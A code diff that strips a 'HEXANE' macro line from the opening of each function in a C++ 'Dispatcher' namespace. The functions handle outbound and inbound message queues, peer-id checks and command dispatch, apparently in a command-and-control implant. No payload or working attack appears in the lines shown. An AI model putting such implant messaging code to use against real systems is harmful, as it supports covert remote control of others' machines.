@@ -2,7 +2,6 @@
 namespace Dispatcher {
 
     DWORD PeekPeerId(const _stream *const stream) {
-        HEXANE
 
         uint32_t pid = 0;
 
@@ -11,7 +10,6 @@ namespace Dispatcher {
     }
 
     VOID AddMessage(_stream *const out) {
-        HEXANE
 
         auto head = Ctx->transport.outbound_queue;
 
@@ -27,7 +25,6 @@ namespace Dispatcher {
     }
 
     VOID RemoveMessage(const _stream *target) {
-        HEXANE
 
         _stream *prev = { };
 
@@ -54,7 +51,6 @@ namespace Dispatcher {
     }
 
     VOID MessageQueue(_stream *const msg) {
-        HEXANE
 
         _parser parser = { };
         _stream *queue = { };
@@ -86,7 +82,6 @@ namespace Dispatcher {
     }
 
     VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
-        HEXANE
 
         _stream     *queue      = { };
         uint32_t    offset      = 0;
@@ -123,7 +118,6 @@ namespace Dispatcher {
     }
 
     VOID PrepareEgress(_stream *out) {
-        HEXANE
 
         _parser parser  = { };
         for (auto head = Ctx->transport.outbound_queue; head; head = head->next) {
@@ -154,7 +148,6 @@ namespace Dispatcher {
     }
 
     VOID PrepareIngress(_stream *in) {
-        HEXANE
 
         if (in) {
             if (PeekPeerId(in) != Ctx->session.peer_id) {
@@ -172,7 +165,6 @@ namespace Dispatcher {
     }
 
     VOID DispatchRoutine() {
-        HEXANE
 
         _stream *out    = { };
         _stream *in     = { };
@@ -206,7 +198,6 @@ namespace Dispatcher {
     }
 
     VOID CommandDispatch (const _stream *const in) {
-        HEXANE
 
         _parser parser = { };
 
